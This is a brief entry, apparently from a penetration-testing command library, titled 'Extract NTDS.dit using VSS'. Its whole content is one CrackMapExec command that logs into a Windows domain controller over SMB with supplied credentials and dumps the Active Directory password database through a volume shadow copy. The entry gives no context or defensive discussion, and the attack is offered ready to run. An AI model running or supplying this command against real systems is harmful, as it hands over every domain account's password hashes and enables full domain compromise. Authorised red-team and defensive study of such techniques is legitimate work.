---
id: 07c011d0-e4cc-4c7a-a0ef-469819d59e29
name: Extract NTDS.dit using VSS
type: command
executor: bash
data: cme smb 10.10.0.202 -u username -p password --ntds vss
output: null
created_at: '2023-04-06T03:56:03.991875+00:00'
updated_at: '2023-04-10T20:25:43.691133+00:00'
---

# Extract NTDS.dit using VSS

```bash
cme smb 10.10.0.202 -u username -p password --ntds vss
```


